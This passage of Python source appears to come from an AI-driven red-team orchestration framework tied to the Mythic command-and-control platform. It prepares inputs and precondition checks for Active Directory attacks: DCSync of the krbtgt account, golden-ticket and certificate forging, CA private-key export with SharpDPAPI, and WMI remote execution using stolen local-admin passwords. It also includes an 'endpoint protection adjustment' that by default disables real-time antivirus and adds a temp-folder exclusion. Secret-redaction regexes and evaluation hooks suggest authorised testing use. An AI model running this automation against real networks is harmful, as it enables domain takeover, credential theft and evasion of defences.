            "password",
            "base64ticket",
            "ticket",
            "ticket_base64",
            "existingticket",
            "local_admin_password",
            "managed_local_admin_secret",
            "secret",
            "credential_text",
            "pfx_password",
            "certificate_password",
            "ca_pfx_password",
            "ca_cert_password",
            "ca_certificate_password",
            "forged_pfx_password",
            "forged_certificate_password",
            "new_cert_password",
        }
        redacted_text_keys = {
            "commands",
            "assembly_arguments",
        }
        if isinstance(parameters, dict):
            out = {}
            for key, value in parameters.items():
                key_text = self._capability_text(key)
                if key_text.casefold() in opaque_secret_keys:
                    out[key] = "<secret>"
                elif key_text.casefold() in redacted_text_keys:
                    out[key] = self._capability_executor_redact_text(value)
                elif isinstance(value, dict):
                    out[key] = self._capability_executor_safe_parameters(value)
                else:
                    out[key] = value
            return out
        return self._capability_executor_redact_text(parameters)

    def _capability_executor_output_preview(self, output, limit: int = 1000) -> str:
        text = self._capability_executor_redact_text(output)
        if len(text) <= limit:
            return text
        return text[-limit:]

    def _capability_executor_redact_text(self, value) -> str:
        text = self._capability_text(value)
        if not text:
            return ""
        text = re.sub(
            r"(?is)(base64\(ticket\.kirbi\)\s*:\s*)([A-Za-z0-9+/=\s\\\/]{64,})",
            r"\1<kerberos_ticket_base64>",
            text,
        )
        text = re.sub(
            r"(?is)([\"']?(?:ticket|credential|base64ticket|ticket_base64)[\"']?\s*[:=]\s*[\"'])([A-Za-z0-9+/=\\\/]{80,})([\"'])",
            r"\1<kerberos_ticket_base64>\3",
            text,
        )
        text = re.sub(
            r"(?<![A-Za-z0-9+/=\\\/])(?:[A-Za-z0-9+/=\\\/]{160,})(?![A-Za-z0-9+/=\\\/])",
            "<base64_blob>",
            text,
        )
        text = re.sub(
            r"(?i)(/(?:aes256|aes128|rc4|ntlm|password):)([^\s\"']+)",
            r"\1<secret>",
            text,
        )
        text = re.sub(r"(?i)\b[0-9a-f]{64}\b", "<hex64_secret>", text)
        text = re.sub(r"(?i)\b[0-9a-f]{32}\b", "<hex32_secret>", text)
        return text

    def _capability_achieved_effects(self) -> set[str]:
        effects: set[str] = set()
        for hop in list(getattr(self, "_engagement_hops", []) or []):
            if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
                continue
            satisfied = list(getattr(hop, "satisfied_effects", []) or [])
            if not satisfied:
                satisfied = [getattr(hop, "effect", "")]
            for effect in satisfied:
                text = self._capability_text(effect)
                if text:
                    effects.add(self._canonical_capability_effect(text))
        return effects

    def _canonical_capability_effect(self, effect) -> str:
        text = self._capability_text(effect).strip().casefold()
        if not text.startswith("creds:"):
            return text
        tail = text[len("creds:"):]
        if "@" not in tail:
            return text
        account, realm = tail.rsplit("@", 1)
        account = self._canonical_credential_account(account)
        realm = realm.strip().casefold()
        if not account or not realm:
            return text
        return f"creds:{account}@{realm}"

    def _capability_action_effects_achieved(self, action, achieved_effects: set[str] | None = None) -> bool:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability in {"ensure-kerberos-context", "ensure-account-kerberos-context"}:
            return False
        wanted = {
            self._capability_text(item)
            for item in list(getattr(action, "effects", []) or [])
            if self._capability_text(item)
        }
        if not wanted:
            return False
        achieved = (
            {self._canonical_capability_effect(item) for item in achieved_effects}
            if achieved_effects is not None else self._capability_achieved_effects()
        )
        # Don't let a COARSE co-effect (da:/ea:) short-circuit a capability that also declares a more SPECIFIC
        # proof effect (e.g. adcs-certificate-auth declares both da:{domain} AND certificate-auth:{acct}@{domain}).
        # If da: was already achieved by some OTHER technique, the specific cert-auth proof was never gathered —
        # skipping it would decline real work and leave the specific effect unverified. Require a specific effect
        # match when one exists; fall back to any-overlap only for capabilities whose effects are all coarse.
        specific = {e for e in wanted if not e.casefold().startswith(("da:", "ea:"))}
        check = specific if specific else wanted
        return bool(check & achieved)

    def _capability_host_scoped_precondition_failure(
        self,
        action,
        inputs: dict,
        achieved_effects: set[str],
    ) -> dict:
        """Fail closed when a compact host-scoped capability is aimed at an unproven host.

        Local-admin and remote-exec effects are host facts, not domain facts. This guard keeps a
        model-authored compact action from using local admin on one machine as evidence for another.
        Rendered NEXT CAPABILITY ACTIONs already carry these preconditions; compact actions need the
        same invariant enforced at execution time.
        """
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability not in {
            "use-managed-local-admin-secret",
            "execute-as-local-admin",
            "endpoint-protection-adjustment",
            "adcs-ca-private-key-export",
        }:
            return {}

        target_host = self._capability_target_host(action, inputs)
        target_domain = (
            self._capability_managed_secret_target_domain(action, inputs)
            or self._capability_target_domain(action, inputs)
            or self._capability_domain(action, inputs)
        )
        host = self._capability_host_short(target_host)
        domain = self._capability_text(target_domain).casefold()
        if not host or not domain:
            return {}

        achieved = {self._canonical_capability_effect(item) for item in achieved_effects}
        local_admin_effect = f"local-admin:{host}@{domain}"
        managed_secret_effect = f"managed-local-admin-secret:{host}@{domain}"
        remote_exec_effect = f"remote-exec:{host}@{domain}"
        local_admin_satisfied = (
            local_admin_effect in achieved
            or f"admin:{host}" in achieved
            or f"system-or-admin:{host}" in achieved
        )

        missing: list[str] = []
        if capability == "use-managed-local-admin-secret" and managed_secret_effect not in achieved:
            missing.append(managed_secret_effect)
        if capability == "execute-as-local-admin" and not local_admin_satisfied:
            missing.append(local_admin_effect)
        if capability in {"endpoint-protection-adjustment", "adcs-ca-private-key-export"}:
            if not local_admin_satisfied:
                missing.append(local_admin_effect)
            if remote_exec_effect not in achieved:
                missing.append(remote_exec_effect)

        if not missing:
            return {}
        return {
            "missing": sorted(set(missing)),
            "reason": (
                "host-scoped capability preconditions are missing for "
                f"{host}@{domain}; local-admin or remote-exec on another host does not satisfy this target"
            ),
        }

    def _capability_artifact_scoped_precondition_failure(
        self,
        action,
        inputs: dict,
        achieved_effects: set[str],
    ) -> dict:
        """Fail closed when an artifact-backed compact action skips its artifact-producing hop."""
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability != "adcs-certificate-auth":
            return {}

        if (
            self._capability_input_bool(inputs, "certificate_already_forged")
            or self._capability_input_bool(inputs, "skip_certificate_forge")
            or self._capability_input_bool(inputs, "pre_forged_certificate")
            or self._capability_input_bool(getattr(action, "intent", {}), "certificate_already_forged")
            or self._capability_input_bool(getattr(action, "intent", {}), "skip_certificate_forge")
            or self._capability_input_bool(getattr(action, "intent", {}), "pre_forged_certificate")
        ):
            return {}

        if self._capability_text(
            inputs.get("ca_pfx_path")
            or inputs.get("ca_cert_path")
            or inputs.get("ca_certificate_path")
            or getattr(action, "intent", {}).get("ca_pfx_path")
            or getattr(action, "intent", {}).get("ca_cert_path")
            or getattr(action, "intent", {}).get("ca_certificate_path")
        ):
            return {}

        domain = (
            self._capability_target_domain(action, inputs)
            or self._capability_domain(action, inputs)
            or self._capability_account_domain(action, inputs)
        )
        account = self._capability_account(action, inputs) or "administrator"
        ca_host = self._capability_text(
            inputs.get("ca_host")
            or getattr(action, "intent", {}).get("ca_host")
            or self._capability_target_host_from_context({"target": getattr(action, "target", "")})
        ).casefold()
        achieved = {self._canonical_capability_effect(item) for item in achieved_effects}

        enrolled_effect = f"adcs-enrolled-certificate:{account}@{domain}" if account and domain else ""
        if enrolled_effect and enrolled_effect in achieved:
            inputs.setdefault("certificate_already_forged", True)
            return {}

        if not ca_host and domain:
            ca_hosts = sorted(self._capability_verified_ca_key_hosts(domain, achieved))
            if len(ca_hosts) == 1:
                ca_host = ca_hosts[0]
                inputs.setdefault("ca_host", ca_host)

        ca_key_effect = f"adcs-ca-private-key:{ca_host}@{domain}" if ca_host and domain else ""
        if ca_key_effect and ca_key_effect in achieved:
            return {}

        missing: list[str] = []
        if not ca_host:
            missing.append("ca_host")
        if domain:
            missing.append(ca_key_effect or f"adcs-ca-private-key:<ca_host>@{domain}")
            if account:
                missing.append(enrolled_effect)
        else:
            missing.append("domain")
        return {
            "missing": sorted(set(item for item in missing if item)),
            "suggested_capability": "adcs-ca-private-key-export",
            "reason": (
                "adcs-certificate-auth requires a verified CA private-key or enrolled-certificate artifact; "
                "run the artifact-producing ADCS capability first instead of probing service access from an "
                "unmaterialized certificate-auth action"
            ),
        }

    def _capability_verified_ca_key_hosts(self, domain: str, achieved_effects: set[str]) -> set[str]:
        target_domain = self._capability_text(domain).casefold()
        if not target_domain:
            return set()
        prefix = "adcs-ca-private-key:"
        suffix = f"@{target_domain}"
        hosts: set[str] = set()
        for effect in achieved_effects:
            text = self._canonical_capability_effect(effect)
            if not text.startswith(prefix) or not text.endswith(suffix):
                continue
            host = text[len(prefix):-len(suffix)]
            if host:
                hosts.add(self._capability_host_short(host))
        return hosts

    def _capability_input_bool(self, inputs: dict, key: str) -> bool:
        value = inputs.get(key) if isinstance(inputs, dict) else None
        if isinstance(value, bool):
            return value
        return self._capability_text(value).casefold() in {"1", "true", "yes", "y", "on"}

    def _eval_adcs_esc_enrollment_hints(self) -> list[dict]:
        """Return scoped eval-only ADCS enrollment hints from the harness environment."""
        raw = self._capability_text(os.environ.get("SAGE_EVAL_ADCS_ESC_ENROLLMENT_HINTS_JSON")).strip()
        if not raw:
            return []
        try:
            decoded = json.loads(raw)
        except Exception:
            return []
        specs = decoded if isinstance(decoded, list) else [decoded]
        hints: list[dict] = []
        for spec in specs:
            if not isinstance(spec, dict):
                continue
            domain = self._capability_text(spec.get("domain") or spec.get("target_domain")).casefold()
            ca_host = self._capability_text(spec.get("ca_host") or spec.get("host")).casefold()
            ca_name = self._capability_text(
                spec.get("ca_name") or spec.get("certificate_authority") or spec.get("ca")
            )
            template = self._capability_text(
                spec.get("template") or spec.get("certificate_template") or spec.get("adcs_template")
            )
            if not (domain or ca_host) or not ca_name or not template:
                continue
            hint = {
                "domain": domain,
                "ca_host": ca_host,
                "ca_name": ca_name,
                "template": template,
            }
            esc_type = self._capability_text(spec.get("esc_type") or spec.get("adcs_esc_type"))
            if esc_type:
                hint["esc_type"] = esc_type
            hints.append(hint)
        return hints

    def _eval_adcs_esc_enrollment_hint(self, domain: str, ca_host: str) -> dict | None:
        domain = self._capability_text(domain).casefold()
        ca_host = self._capability_host_short(self._capability_text(ca_host).casefold())
        for hint in self._eval_adcs_esc_enrollment_hints():
            hint_domain = self._capability_text(hint.get("domain")).casefold()
            hint_host = self._capability_host_short(self._capability_text(hint.get("ca_host")).casefold())
            if hint_domain and hint_domain != domain:
                continue
            if hint_host and hint_host != ca_host:
                continue
            return hint
        return None

    async def _augment_capability_runtime_inputs(self, action, inputs: dict) -> None:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability not in {
            "dcsync-krbtgt",
            "dcsync-account",
            "forge-golden-ticket",
            "ensure-kerberos-context",
            "ensure-account-kerberos-context",
            "read-managed-local-admin-secret",
            "use-managed-local-admin-secret",
            "execute-as-local-admin",
            "endpoint-protection-adjustment",
            "gpo-controlled-system-exec",
            "adcs-ca-private-key-export",
            "adcs-esc-certificate-enroll",
            "adcs-certificate-auth",
        }:
            return

        self._normalize_capability_ticket_inputs(inputs)
        if capability == "gpo-controlled-system-exec":
            intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
            if not self._capability_text(
                inputs.get("current_host")
                or inputs.get("callback_host")
                or inputs.get("foothold_host")
                or inputs.get("local_host")
            ):
                callback_id = self._capability_callback_id(action, inputs)
                if callback_id:
                    for foothold in list(getattr(self, "_engagement_footholds", []) or []):
                        if self._capability_text(getattr(foothold, "callback_id", "")) == callback_id:
                            host = self._capability_text(getattr(foothold, "host", ""))
                            if host:
                                inputs["current_host"] = host
                                inputs["callback_host"] = host
                            identity = self._capability_text(getattr(foothold, "identity", ""))
                            if identity:
                                inputs.setdefault("current_identity", identity)
                                inputs.setdefault("current_user", identity)
                                inputs.setdefault("controlled_principal", identity)
                            break
            else:
                callback_id = self._capability_callback_id(action, inputs)
                if callback_id and not self._capability_text(
                    inputs.get("controlled_principal")
                    or inputs.get("current_identity")
                    or inputs.get("current_user")
                ):
                    for foothold in list(getattr(self, "_engagement_footholds", []) or []):
                        if self._capability_text(getattr(foothold, "callback_id", "")) == callback_id:
                            identity = self._capability_text(getattr(foothold, "identity", ""))
                            if identity:
                                inputs.setdefault("current_identity", identity)
                                inputs.setdefault("current_user", identity)
                                inputs.setdefault("controlled_principal", identity)
                            break
            target_fields = {}
            try:
                for part in self._capability_text(getattr(action, "target", "")).split(";"):
                    if "=" in part:
                        key, value = part.split("=", 1)
                        target_fields[key.strip().casefold()] = value.strip()
            except Exception:
                target_fields = {}
            gpo = self._capability_text(
                inputs.get("gpo")
                or inputs.get("gpo_name")
                or inputs.get("gponame")
                or inputs.get("gpo_display_name")
                or intent.get("gpo")
                or intent.get("gpo_name")
                or intent.get("gponame")
                or intent.get("gpo_display_name")
                or target_fields.get("gpo")
                or target_fields.get("gpo_name")
                or target_fields.get("gponame")
                or target_fields.get("gpo_display_name")
            ).casefold()
            gpo_guid_input = self._capability_text(
                inputs.get("gpo_guid")
                or inputs.get("guid")
                or inputs.get("gpo_object_guid")
                or intent.get("gpo_guid")
                or intent.get("guid")
                or intent.get("gpo_object_guid")
                or target_fields.get("gpo_guid")
                or target_fields.get("guid")
                or target_fields.get("gpo_object_guid")
            ).strip().strip("{}").casefold()
            if gpo_guid_input and (not gpo or gpo.strip().strip("{}") == gpo_guid_input):
                for graph_fact in list(getattr(self, "_engagement_graph_facts", []) or []):
                    predicate = self._capability_text(getattr(graph_fact, "predicate", "")).casefold()
                    if not predicate.startswith("gpo-guid:"):
                        continue
                    parts = predicate.split(":")
                    if len(parts) >= 3 and parts[-1].strip().strip("{}") == gpo_guid_input:
                        gpo = parts[1].strip()
                        intent["gpo"] = gpo
                        break
            domain = self._capability_text(inputs.get("domain") or intent.get("domain") or target_fields.get("domain")).casefold()
            if gpo:
                inputs["gpo"] = gpo
            if domain:
                inputs["domain"] = domain
            if not self._capability_text(inputs.get("gpo_guid") or inputs.get("guid") or inputs.get("gpo_object_guid")) and gpo:
                prefix = f"gpo-guid:{gpo}:"
                for graph_fact in list(getattr(self, "_engagement_graph_facts", []) or []):
                    predicate = self._capability_text(getattr(graph_fact, "predicate", "")).casefold()
                    if predicate.startswith(prefix):
                        guid = predicate[len(prefix):].strip()
                        if guid:
                            inputs["gpo_guid"] = guid
                            break
            if not inputs.get("affected_hosts") and gpo and domain:
                prefix = f"gpo-affects-computer:{gpo}:"
                hosts = []
                for graph_fact in list(getattr(self, "_engagement_graph_facts", []) or []):
                    predicate = self._capability_text(getattr(graph_fact, "predicate", "")).casefold()
                    if not predicate.startswith(prefix):
                        continue
                    tail = predicate[len(prefix):]
                    parts = tail.split(":")
                    if len(parts) < 2:
                        continue
                    host = parts[0].strip()
                    fact_domain = ":".join(parts[1:]).strip()
                    if host and fact_domain == domain and host not in hosts:
                        hosts.append(host)
                if hosts:
                    inputs["affected_hosts"] = hosts
            if not inputs.get("affected_dc_hosts") and gpo and domain:
                prefix = f"gpo-affects-dc:{gpo}:"
                hosts = []
                for graph_fact in list(getattr(self, "_engagement_graph_facts", []) or []):
                    predicate = self._capability_text(getattr(graph_fact, "predicate", "")).casefold()
                    if not predicate.startswith(prefix):
                        continue
                    tail = predicate[len(prefix):]
                    parts = tail.split(":")
                    if len(parts) < 2:
                        continue
                    host = parts[0].strip()
                    fact_domain = ":".join(parts[1:]).strip()
                    if host and fact_domain == domain and host not in hosts:
                        hosts.append(host)
                if hosts:
                    inputs["affected_dc_hosts"] = hosts
                else:
                    scoped_dc_value = (
                        inputs.get("target_dc")
                        or inputs.get("target_domain_controller")
                        or inputs.get("domain_controller")
                        or inputs.get("dc")
                        or intent.get("target_dc")
                        or intent.get("target_domain_controller")
                        or intent.get("domain_controller")
                        or intent.get("dc")
                    )
                    scoped_dc_text = self._capability_text(scoped_dc_value)
                    if scoped_dc_text:
                        inputs["affected_dc_hosts"] = [scoped_dc_text]
            if not self._capability_text(inputs.get("ldap_server")) and domain:
                affected_dc_value = inputs.get("affected_dc_hosts")
                if isinstance(affected_dc_value, (list, tuple)):
                    affected_dc_value = affected_dc_value[0] if affected_dc_value else ""
                dc_value = (
                    inputs.get("domain_controller")
                    or inputs.get("dc")
                    or inputs.get("target_dc")
                    or inputs.get("target_domain_controller")
                    or inputs.get("target_host")
                    or inputs.get("host")
                    or intent.get("domain_controller")
                    or intent.get("dc")
                    or intent.get("target_dc")
                    or intent.get("target_domain_controller")
                    or intent.get("target_host")
                    or intent.get("host")
                    or affected_dc_value
                )
                ldap_server = self._capability_host_name(dc_value, domain)
                if ldap_server:
                    inputs["ldap_server"] = ldap_server
            return
        if capability in {"dcsync-krbtgt", "dcsync-account"}:
            domain = self._capability_domain(action, inputs)
            account = self._capability_account(action, inputs) or ("krbtgt" if capability == "dcsync-krbtgt" else "")
            if domain:
                inputs["domain"] = domain
            if account:
                inputs["account"] = account
            if domain and not self._capability_text(inputs.get("domain_controller") or inputs.get("dc")):
                host = await self._resolve_domain_controller_host(domain)
                if host:
                    inputs["domain_controller"] = host
                    inputs["domain_controller_source"] = f"BloodHound Domain Controllers membership for {domain}"
            return
        if capability == "adcs-certificate-auth":
            domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
            account = self._capability_account(action, inputs) or "administrator"
            callback_id = self._capability_callback_id(action, inputs)
            ca_host = self._capability_text(
                inputs.get("ca_host")
                or getattr(action, "intent", {}).get("ca_host")
                or self._capability_target_host_from_context({"target": getattr(action, "target", "")})
            ).casefold()
            if domain:
                inputs["domain"] = domain
                inputs["target_domain"] = domain
            if account:
                inputs["account"] = account
            if callback_id:
                inputs["callback_id"] = callback_id
            if ca_host:
                inputs["ca_host"] = ca_host
            slug = self._capability_slug("_".join(part for part in (account, domain, callback_id) if part))
            if not self._capability_text(inputs.get("proof_marker") or inputs.get("auth_marker")):
                inputs["proof_marker"] = f"SAGE_CERT_AUTH_PROOF_{slug}"
            if not self._capability_text(
                inputs.get("forged_pfx_path")
                or inputs.get("forged_certificate_path")
                or inputs.get("new_cert_path")
                or inputs.get("certificate_path")
            ):
                inputs["forged_pfx_path"] = f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
                inputs["_auto_forged_pfx_path"] = True
            if not self._capability_text(
                inputs.get("forged_pfx_password")
                or inputs.get("forged_certificate_password")
                or inputs.get("new_cert_password")
                or inputs.get("certificate_password")
            ):
                inputs["forged_pfx_password"] = self._artifact_secret("SageCert", slug)
            if not self._capability_text(inputs.get("subject") or inputs.get("certificate_subject")) and account:
                inputs["subject"] = f"CN={account}"
            if not self._capability_text(inputs.get("subject_alt_name") or inputs.get("san") or inputs.get("upn")) and account and domain:
                inputs["subject_alt_name"] = f"{account}@{domain}"
            await self._augment_capability_ticket_proof_target(inputs, domain)
            return
        if capability == "adcs-esc-certificate-enroll":
            domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
            account = self._capability_account(action, inputs) or "administrator"
            callback_id = self._capability_callback_id(action, inputs)
            intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
            ca_host = self._capability_text(
                inputs.get("ca_host")
                or intent.get("ca_host")
                or self._capability_target_host_from_context({"target": getattr(action, "target", "")})
            ).casefold()
            if domain:
                inputs["domain"] = domain
                inputs["target_domain"] = domain
            if account:
                inputs["account"] = account
            if callback_id:
                inputs["callback_id"] = callback_id
            if ca_host:
                inputs["ca_host"] = ca_host
            hint = self._eval_adcs_esc_enrollment_hint(domain, ca_host)
            hint_applied = False
            if hint and not self._capability_text(
                inputs.get("ca_name")
                or inputs.get("certificate_authority")
                or inputs.get("ca")
                or intent.get("ca_name")
                or intent.get("certificate_authority")
                or intent.get("ca")
            ):
                inputs["ca_name"] = hint["ca_name"]
                hint_applied = True
            if hint and not self._capability_text(
                inputs.get("template")
                or inputs.get("certificate_template")
                or inputs.get("adcs_template")
                or intent.get("template")
                or intent.get("certificate_template")
                or intent.get("adcs_template")
            ):
                inputs["template"] = hint["template"]
                hint_applied = True
            if hint and hint.get("esc_type") and not self._capability_text(
                inputs.get("esc_type")
                or inputs.get("adcs_esc_type")
                or intent.get("esc_type")
                or intent.get("adcs_esc_type")
            ):
                inputs["esc_type"] = hint["esc_type"]
                hint_applied = True
            if hint_applied:
                inputs["adcs_esc_enrollment_hint_source"] = "SAGE_EVAL_ADCS_ESC_ENROLLMENT_HINTS_JSON"
            slug = self._capability_slug("_".join(part for part in (account, domain, callback_id) if part))
            if not self._capability_text(inputs.get("proof_marker") or inputs.get("enroll_marker")):
                inputs["proof_marker"] = f"SAGE_CERT_ENROLL_PROOF_{slug}"
            if not self._capability_text(
                inputs.get("certificate_path")
                or inputs.get("forged_pfx_path")
                or inputs.get("forged_certificate_path")
                or inputs.get("new_cert_path")
            ):
                inputs["certificate_path"] = f"C:\\Windows\\Temp\\sage_forged_cert_{slug}.pfx"
            if not self._capability_text(
                inputs.get("certificate_password")
                or inputs.get("forged_pfx_password")
                or inputs.get("forged_certificate_password")
                or inputs.get("new_cert_password")
            ):
                inputs["certificate_password"] = self._artifact_secret("SageCert", slug)
            if not self._capability_text(inputs.get("subject") or inputs.get("certificate_subject")) and account:
                inputs["subject"] = f"CN={account}"
            if not self._capability_text(inputs.get("subject_alt_name") or inputs.get("san") or inputs.get("upn")) and account and domain:
                inputs["subject_alt_name"] = f"{account}@{domain}"
            return
        if capability == "endpoint-protection-adjustment":
            target_host = self._capability_target_host(action, inputs)
            target_domain = self._capability_managed_secret_target_domain(action, inputs)
            callback_id = self._capability_callback_id(action, inputs)
            local_account = self._capability_local_account(action, inputs)
            if target_host:
                inputs["target_host"] = target_host
            if target_domain:
                inputs["target_domain"] = target_domain
            if callback_id:
                inputs["callback_id"] = callback_id
            if local_account:
                inputs["local_account"] = local_account
            slug = self._capability_slug("_".join(part for part in (target_host, callback_id) if part))
            if not self._capability_text(inputs.get("proof_marker") or inputs.get("adjustment_marker")):
                inputs["proof_marker"] = f"SAGE_EP_ADJUST_PROOF_{slug}"
            if target_host and not self._capability_text(inputs.get("output_path") or inputs.get("remote_output_path")):
                inputs["output_path"] = f"C:\\Windows\\Temp\\sage_ep_adjust_{slug}.txt"
            if "actions" not in inputs and "endpoint_actions" not in inputs and "protection_actions" not in inputs:
                inputs["actions"] = ["disable_realtime", "add_exclusion"]
            if "exclusion_paths" not in inputs and "exclusions" not in inputs and "exclusion_path" not in inputs:
                inputs["exclusion_paths"] = [r"C:\Windows\Temp"]
            if not self._capability_text(
                inputs.get("password")
                or inputs.get("local_admin_password")
                or inputs.get("managed_local_admin_secret")
                or inputs.get("secret")
                or inputs.get("credential")
                or inputs.get("credential_text")
            ):
                credential = await self._select_managed_local_admin_credential(
                    target_host,
                    target_domain,
                    local_account,
                )
                if credential:
                    inputs["password"] = credential["credential"]
                    inputs["credential_id"] = credential.get("id")
                    inputs["credential_source"] = "mythic_credential_store"
                    inputs["credential_realm"] = credential.get("realm")
                    inputs["credential_account"] = credential.get("account")
            return
        if capability == "adcs-ca-private-key-export":
            target_host = self._capability_target_host(action, inputs)
            target_domain = self._capability_managed_secret_target_domain(action, inputs)
            callback_id = self._capability_callback_id(action, inputs)
            local_account = self._capability_local_account(action, inputs)
            if target_host:
                inputs["target_host"] = target_host
            if target_domain:
                inputs["target_domain"] = target_domain
            if callback_id:
                inputs["callback_id"] = callback_id
            if local_account:
                inputs["local_account"] = local_account
            slug = self._capability_slug("_".join(part for part in (target_host, callback_id) if part))
            if not self._capability_text(inputs.get("proof_marker") or inputs.get("export_marker")):
                inputs["proof_marker"] = f"SAGE_CA_EXPORT_PROOF_{slug}"
            if target_host and not self._capability_text(inputs.get("pfx_path") or inputs.get("remote_pfx_path")):
                inputs["pfx_path"] = f"C:\\Windows\\Temp\\sage_ca_export_{slug}.pfx"
            if target_host and not self._capability_text(
                inputs.get("metadata_path") or inputs.get("meta_path") or inputs.get("remote_metadata_path")
            ):
                inputs["metadata_path"] = f"C:\\Windows\\Temp\\sage_ca_export_{slug}.txt"
            if not self._capability_text(inputs.get("pfx_password") or inputs.get("certificate_password")):
                inputs["pfx_password"] = self._artifact_secret("SagePfx", slug)
            export_method = self._capability_text(
                inputs.get("adcs_ca_export_method")
                or inputs.get("ca_export_method")
                or inputs.get("export_method")
            ).casefold()
            if export_method in {"sharpdpapi", "dpapi", "machine-dpapi", "machine_dpapi"}:
                tool_name = self._capability_text(inputs.get("dpapi_tool") or inputs.get("tool") or "SharpDPAPI.exe")
                if tool_name:
                    inputs.setdefault("tool", tool_name)
                if tool_name and not self._capability_text(
                    inputs.get("tool_file_uuid")
                    or inputs.get("dpapi_tool_file_uuid")
                    or inputs.get("file_uuid")
                ):
                    try:
                        upload_state = json.loads(await self.ensure_tool_uploaded(tool_name))
                    except Exception as exc:
                        upload_state = {
                            "status": "error",
                            "binary_filename": tool_name,
                            "error": str(exc),
                        }
                    if isinstance(upload_state, dict) and upload_state.get("file_uuid"):
                        inputs["tool_file_uuid"] = upload_state["file_uuid"]
                        inputs["tool_upload_status"] = upload_state.get("status")
                    elif isinstance(upload_state, dict):
                        inputs["tool_upload_status"] = upload_state.get("status")
                        inputs["tool_upload_reason"] = (
                            upload_state.get("note")
                            or upload_state.get("error")
                            or "tool file UUID unavailable"
                        )
                inputs.setdefault("adcs_ca_export_use_current_context", False)
                inputs.setdefault(
                    "adcs_ca_export_command",
                    inputs.get("adcs_ca_dpapi_export_command")
                    or inputs.get("dpapi_export_command")
                    or "powerpick",
                )
            else:
                remote_exec_effect = f"remote-exec:{self._capability_text(target_host).casefold()}@{self._capability_text(target_domain).casefold()}"
                if remote_exec_effect in self._capability_achieved_effects():
                    inputs.setdefault("adcs_ca_export_use_current_context", False)
                    if not self._capability_text(inputs.get("adcs_ca_export_command")):
                        requested_export_command = self._capability_text(
                            inputs.get("adcs_ca_remote_exec_command")
                            or inputs.get("local_admin_remote_exec_command")
                            or inputs.get("remote_exec_command")
                            or inputs.get("adcs_ca_orchestration_command")
                            or inputs.get("local_powershell_command")
                        )
                        if requested_export_command:
                            inputs["adcs_ca_export_command"] = requested_export_command
                    payload_type = ""
                    if callback_id:
                        try:
                            payload_type = self._capability_text(
                                await self._resolve_payload_type(int(callback_id))
                            ).casefold()
                        except Exception:
                            payload_type = ""
                    if payload_type == "apollo" and "local_admin_remote_exec_reuse_token_context" not in inputs:
                        inputs["local_admin_remote_exec_reuse_token_context"] = self._callback_has_local_admin_logon_context(
                            callback_id,
                            target_host,
                            target_domain,
                            local_account,
                        )
                else:
                    inputs.setdefault("adcs_ca_export_use_current_context", True)
                    inputs.setdefault("current_context_powershell_command", "powerpick")
                    inputs.setdefault("adcs_ca_export_command", inputs.get("current_context_powershell_command") or "powerpick")
            if not self._capability_text(
                inputs.get("password")
                or inputs.get("local_admin_password")
                or inputs.get("managed_local_admin_secret")
                or inputs.get("secret")
                or inputs.get("credential")
                or inputs.get("credential_text")
            ):
                credential = await self._select_managed_local_admin_credential(
                    target_host,
                    target_domain,
                    local_account,
                )
                if credential:
                    inputs["password"] = credential["credential"]
                    inputs["credential_id"] = credential.get("id")
                    inputs["credential_source"] = "mythic_credential_store"
                    inputs["credential_realm"] = credential.get("realm")
                    inputs["credential_account"] = credential.get("account")
            return
        if capability == "execute-as-local-admin":
            target_host = self._capability_target_host(action, inputs)
            target_domain = self._capability_managed_secret_target_domain(action, inputs)
            callback_id = self._capability_callback_id(action, inputs)
            local_account = self._capability_local_account(action, inputs)
            if target_host:
                inputs["target_host"] = target_host
            if target_domain:
                inputs["target_domain"] = target_domain
            if callback_id:
                inputs["callback_id"] = callback_id
            if local_account:
                inputs["local_account"] = local_account
            slug = self._capability_slug("_".join(part for part in (target_host, callback_id) if part))
            if not self._capability_text(inputs.get("proof_marker")):
                inputs["proof_marker"] = f"SAGE_REMOTE_EXEC_PROOF_{slug}"
            if target_host and not self._capability_text(inputs.get("proof_path") or inputs.get("remote_proof_path")):
                inputs["proof_path"] = f"C:\\Windows\\Temp\\sage_remote_exec_{slug}.txt"
            if target_host and target_domain and not self._capability_text(
                inputs.get("proof_unc") or inputs.get("proof_resource") or inputs.get("target_resource")
            ):
                host = self._capability_host_name(target_host, target_domain)
                proof_path = self._capability_text(inputs.get("proof_path") or inputs.get("remote_proof_path"))
                inputs["proof_unc"] = self._capability_unc_from_windows_path(host, proof_path)
            if not self._capability_text(
                inputs.get("password")
                or inputs.get("local_admin_password")
                or inputs.get("managed_local_admin_secret")
                or inputs.get("secret")
                or inputs.get("credential")
                or inputs.get("credential_text")
            ):
                credential = await self._select_managed_local_admin_credential(
                    target_host,
                    target_domain,
                    local_account,
                )
                if credential:
                    inputs["password"] = credential["credential"]
                    inputs["credential_id"] = credential.get("id")
                    inputs["credential_source"] = "mythic_credential_store"
                    inputs["credential_realm"] = credential.get("realm")
                    inputs["credential_account"] = credential.get("account")
            payload_type = ""
            if callback_id:
                try:
                    payload_type = self._capability_text(await self._resolve_payload_type(int(callback_id))).casefold()
                except Exception:
                    payload_type = ""
            if payload_type == "apollo":
                if not self._capability_text(inputs.get("local_admin_remote_exec_command") or inputs.get("remote_exec_command")):
                    inputs["local_admin_remote_exec_command"] = "wmiexecute"
                if "local_admin_remote_exec_reuse_token_context" not in inputs:
                    inputs["local_admin_remote_exec_reuse_token_context"] = self._callback_has_local_admin_logon_context(
                        callback_id,
                        target_host,
                        target_domain,
                        local_account,
                    )
            return
        if capability == "use-managed-local-admin-secret":
            target_host = self._capability_target_host(action, inputs)
            target_domain = self._capability_managed_secret_target_domain(action, inputs)
            callback_id = self._capability_callback_id(action, inputs)
            local_account = self._capability_local_account(action, inputs)
            if target_host:
                inputs["target_host"] = target_host
            if target_domain:
                inputs["target_domain"] = target_domain
            if callback_id:
                inputs["callback_id"] = callback_id
            if local_account:
                inputs["local_account"] = local_account
            if target_host and target_domain and not self._capability_text(
